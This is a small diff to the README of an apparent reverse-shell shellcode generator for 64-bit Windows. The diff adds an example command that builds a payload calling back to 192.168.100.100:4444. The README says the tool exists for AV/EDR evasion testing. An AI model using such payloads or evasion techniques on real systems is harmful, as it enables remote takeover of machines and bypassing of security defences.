@@ -12,6 +12,12 @@ Usage of ./shell_reverse_tcp:
         Port number (0-65535) (default 4444)
 ```
 
+## Example
+
+```
+$ ./shell_reverse_tcp -host 192.168.100.100 -port 4444 > shellcode.bin
+```
+
 # Project spirit
 Generate your payload in x64 quickly and easily without dependencies to perform AV/EDR evasion tests on Windows in amd64, so you can use encoders, ciphers, obfuscators, whatever.
 
